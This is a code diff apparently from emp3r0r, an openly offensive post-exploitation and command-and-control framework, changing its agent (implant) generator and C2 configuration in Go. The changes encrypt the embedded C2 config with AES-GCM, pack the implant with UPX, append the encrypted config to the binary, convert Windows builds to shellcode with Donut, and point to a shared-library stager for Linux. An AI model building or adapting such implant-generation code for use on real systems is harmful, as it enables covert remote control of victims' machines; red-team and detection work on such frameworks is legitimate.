@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"strings"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -35,7 +36,7 @@ func modGenAgent() {
 		agent_binary_path string
 	)
 	now := time.Now()
-	stubFile := fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Linux, arch_choice)
+	stubFile := ""
 	os_choice := Options["os"].Val
 	arch_choice = Options["arch"].Val
 	is_arch_valid := func(arch string) bool {
@@ -79,6 +80,7 @@ func modGenAgent() {
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
 			EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
+
 	default:
 		CliPrintError("Unsupported OS: %s", os_choice)
 		return
@@ -105,10 +107,9 @@ func modGenAgent() {
 	}
 
 	// encrypt
-	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
-	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
-	if encryptedJSONBytes == nil {
-		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
+	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_data.OneTimeMagicBytes, jsonBytes)
+	if err != nil {
+		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
 		return
 	}
 
@@ -134,7 +135,7 @@ func modGenAgent() {
 		return
 	}
 	// write
-	err = os.WriteFile(outfile, toWrite, 0755)
+	err = os.WriteFile(outfile, toWrite, 0o755)
 	if err != nil {
 		CliPrintError("Save agent binary %s: %v", outfile, err)
 		return
@@ -146,8 +147,12 @@ func modGenAgent() {
 	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_data.OneTimeMagicBytes)
 	agent_binary_path = outfile
 
-	// pack it with upx
 	packed_file := fmt.Sprintf("%s.packed", outfile)
+	if os_choice == "windows" {
+		packed_file = fmt.Sprintf("%s.packed.exe", outfile)
+	}
+
+	// pack it with upx
 	err = upx(outfile, packed_file)
 	if err != nil {
 		CliPrintWarning("UPX: %v", err)
@@ -155,22 +160,42 @@ func modGenAgent() {
 	}
 
 	// append magic_str so it will still extract config data
-	packed_bin_data, err := os.ReadFile(packed_file)
+	err = appendConfigToPayload(packed_file, sep, encryptedJSONBytes)
 	if err != nil {
-		CliPrintError("Failed to read UPX packed file: %v", err)
+		CliPrintError("Failed to append config to packed binary: %v", err)
 		return
 	}
-	toWrite = append(packed_bin_data, sep...)
-	toWrite = append(toWrite, encryptedJSONBytes...)
-	toWrite = append(toWrite, sep...)
-	err = os.WriteFile(packed_file, toWrite, 0755)
-	if err != nil {
-		CliPrintError("Failed to save final agent binary: %v", err)
-		return
-	}
+
 	agent_binary_path = packed_file
-	CliPrint("Generated agent binary: %s."+
-		"You can `use stager` to generate a one liner for your target host", agent_binary_path)
+	CliPrint("Generated agent binary: %s.", agent_binary_path)
+
+	if os_choice == "windows" {
+		// generate shellcode for the agent binary
+		DonoutPE2Shellcode(outfile, arch_choice)
+		appendConfigToPayload(outfile+".bin", sep, encryptedJSONBytes)
+	}
+	if os_choice == "linux" {
+		// tell user to use shared library stager
+		CliPrint("Navigate to `loader/elf` and run `make stager_so` to generate shared library stager, don't forget to modify `stager.c` to fit your needs. You will need another stager to load the shared library.")
+	}
+}
+
+func appendConfigToPayload(file string, sep, config []byte) (err error) {
+	packed_bin_data, err := os.ReadFile(file)
+	if err != nil {
+		err = fmt.Errorf("failed to read file %s: %v", file, err)
+		return
+	}
+	toWrite := append(packed_bin_data, sep...)
+	toWrite = append(toWrite, config...)
+	toWrite = append(toWrite, sep...)
+	err = os.WriteFile(file, toWrite, 0o755)
+	if err != nil {
+		err = fmt.Errorf("failed to save final agent binary: %v", err)
+		return
+	}
+
+	return
 }
 
 func MakeConfig() (err error) {
@@ -207,7 +232,7 @@ func MakeConfig() (err error) {
 	if !exists {
 		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
 			RuntimeConfig.CCHost)
-		cc_hosts = append(cc_hosts, existing_names...) // append new name
+		cc_hosts = append(cc_hosts, RuntimeConfig.CCHost) // append new name
 		// remove old certs
 		os.RemoveAll(ServerCrtFile)
 		os.RemoveAll(ServerKeyFile)
@@ -221,6 +246,13 @@ func MakeConfig() (err error) {
 				err, RuntimeConfig.CCHost)
 		} else {
 			CliPrintWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)
+
+			c2_names := tun.NamesInCert(ServerCrtFile)
+			if len(c2_names) <= 0 {
+				CliFatalError("C2 has no names?")
+			}
+			name_list := strings.Join(c2_names, ", ")
+			CliPrintInfo("Updated C2 server names: %s", name_list)
 			go TLSServer()
 		}
 	}
@@ -243,17 +275,8 @@ func MakeConfig() (err error) {
 	RuntimeConfig.CDNProxy = Options["cdn_proxy"].Val
 
 	// shadowsocks and kcp
-	if Options["shadowsocks"].Val == "on" ||
-		Options["shadowsocks"].Val == "with_kcp" {
-		RuntimeConfig.UseShadowsocks = true
-		if Options["shadowsocks"].Val == "with_kcp" {
-			RuntimeConfig.UseKCP = true
-		}
-		RuntimeConfig.UseShadowsocks = true
-	} else {
-		RuntimeConfig.UseShadowsocks = false
-		RuntimeConfig.UseKCP = false
-	}
+	RuntimeConfig.UseShadowsocks = Options["shadowsocks"].Val == "on" || Options["shadowsocks"].Val == "bare"
+	RuntimeConfig.UseKCP = Options["shadowsocks"].Val != "bare" && RuntimeConfig.UseShadowsocks
 
 	// agent proxy for c2 transport
 	RuntimeConfig.C2TransportProxy = Options["c2transport_proxy"].Val
